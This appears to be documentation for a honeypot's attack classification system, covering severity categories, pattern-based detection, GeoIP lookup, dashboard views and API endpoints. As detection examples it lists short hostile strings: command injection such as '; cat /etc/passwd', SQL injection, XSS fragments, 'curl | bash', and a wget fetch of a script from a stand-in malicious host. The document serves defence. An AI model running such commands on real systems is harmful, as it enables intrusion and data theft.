# Attack Classification System

## Overview

The honeypot platform automatically classifies and categorizes all detected attacks, providing detailed information about attack types, severity, and patterns.

## Attack Categories

### Critical Severity

1. **SQL Injection** 💉
   - Pattern: SQL query injection attempts
   - Examples: `UNION SELECT`, `'; --`, `OR 1=1`, `DROP TABLE`
   - Severity: Critical

2. **Command Injection** ⚡
   - Pattern: Command execution attempts
   - Examples: `; cat /etc/passwd`, `| bash`, `` `whoami` ``, `$(id)`
   - Severity: Critical

3. **Malware Deployment** 🦠
   - Pattern: Malware download/execution attempts
   - Examples: `wget http://...`, `curl | bash`, `powershell download`
   - Severity: Critical

4. **Data Exfiltration** 📤
   - Pattern: Data theft attempts
   - Examples: `cat /etc/passwd`, `type config`, `download file`
   - Severity: Critical

### High Severity

5. **Brute Force** 🔨
   - Pattern: Repeated authentication attempts
   - Detection: 3+ login attempts or failed authentications
   - Severity: High

6. **Path Traversal** 📁
   - Pattern: Directory traversal attempts
   - Examples: `../`, `../../`, `/etc/passwd`, `c:\windows\system32`
   - Severity: High

7. **Cross-Site Scripting (XSS)** 🎯
   - Pattern: XSS attack attempts
   - Examples: `<script>`, `javascript:`, `onerror=`, `alert(`
   - Severity: High

8. **Credential Harvesting** 🎣
   - Pattern: Credential theft attempts
   - Examples: Password extraction, credential collection
   - Severity: High

9. **Privilege Escalation** ⬆️
   - Pattern: Privilege escalation attempts
   - Examples: `sudo`, `su root`, `chmod 777`
   - Severity: High

10. **Denial of Service** 💥
    - Pattern: DoS/DDoS attempts
    - Examples: Fork bombs, infinite loops, flooding
    - Severity: High

### Medium Severity

11. **Reconnaissance** 🔍
    - Pattern: Information gathering
    - Examples: `whoami`, `uname`, `ifconfig`, `netstat`, `ps aux`
    - Severity: Medium

12. **Unauthorized Access** 🚫
    - Pattern: Unauthorized access attempts
    - Examples: Admin panel access, root login attempts
    - Severity: Medium

## How Classification Works

### Automatic Detection

1. **Pattern Matching**: Analyzes commands, queries, and requests for known attack patterns
2. **Behavioral Analysis**: Detects brute force through multiple failed attempts
3. **Context Analysis**: Considers protocol, timing, and sequence of actions

### Classification Process

```
Session Data → Text Extraction → Pattern Matching → Attack Classification → Severity Assignment
```

### Example Classification

**SSH Session:**
- Commands: `whoami`, `cat /etc/passwd`, `wget http://malicious.com/script.sh`
- Classified as:
  - Reconnaissance (whoami)
  - Data Exfiltration (cat /etc/passwd)
  - Malware Deployment (wget)

**HTTP Request:**
- Path: `/admin`
- Query: `?id=1' UNION SELECT * FROM users--`
- Classified as:
  - Unauthorized Access (admin panel)
  - SQL Injection (UNION SELECT)

## Location Information

### GeoIP Lookup

The system automatically looks up IP addresses to determine:
- **Country**: Country name and code
- **City**: City name
- **ISP**: Internet Service Provider
- **Region**: State/Province
- **Coordinates**: Latitude/Longitude (if available)

### Data Sources

Uses multiple free GeoIP services:
1. ip-api.com (primary)
2. ipapi.co (fallback)
3. geojs.io (fallback)

### Privacy

- Local/private IPs are marked as "Local Network"
- Results are cached to reduce API calls
- No personal data is stored beyond IP addresses

## Dashboard Features

### Attack Summary

Each attacker profile shows:
- **Total Attacks**: Number of detected attacks
- **Severity Breakdown**: Critical, High, Medium, Low counts
- **Attack Categories**: List of attack types used
- **Location**: Country, city, ISP information

### Session Details

Each session displays:
- **Attack Types**: Icons and names of detected attacks
- **Severity Indicators**: Color-coded by highest severity
- **Location Badge**: Country/city information
- **Attack Tags**: Visual indicators for each attack type

### Filtering

- Filter by IP address
- Filter by protocol (SSH, HTTP, Database, etc.)
- Sort by attack severity
- Sort by number of attacks

## API Endpoints

### Get Attack Categories
```
GET /api/attack-categories
```
Returns all available attack categories with descriptions.

### Get Attackers Summary
```
GET /api/attackers-summary
```
Returns summary of all attackers with:
- Location information
- Attack categories
- Severity counts
- Session list

### Get Session Details
```
GET /api/session/<filename>
```
Returns session with:
- Location information
- Classified attacks
- Attack summary

## Best Practices

1. **Review Critical Attacks First**: Focus on critical severity attacks
2. **Check Location Patterns**: Look for attacks from unusual locations
3. **Monitor Attack Categories**: Track which attack types are most common
4. **Correlate with IOCs**: Combine attack classification with IOC detection
5. **Export Data**: Use attack classification for threat intelligence

## Customization

### Adding New Attack Patterns

Edit `monitoring/web-dashboard/attack_classifier.py`:

```python
ATTACK_PATTERNS['new_category'] = [
    r'pattern1',
    r'pattern2',
]

ATTACK_CATEGORIES['new_category'] = {
    'name': 'New Attack Type',
    'description': 'Description',
    'severity': 'high',
    'icon': '🔴'
}
```

### Adjusting Severity

Modify severity levels in `ATTACK_CATEGORIES`:
- `critical`: Immediate threat
- `high`: Significant threat
- `medium`: Moderate threat
- `low`: Minor threat

## Summary

The attack classification system provides:
- ✅ Automatic attack detection and categorization
- ✅ Severity-based prioritization
- ✅ Location-based threat intelligence
- ✅ Visual indicators in dashboard
- ✅ Comprehensive attack summaries
- ✅ API access for integration

All attacks are automatically classified and displayed with location information for comprehensive threat analysis.




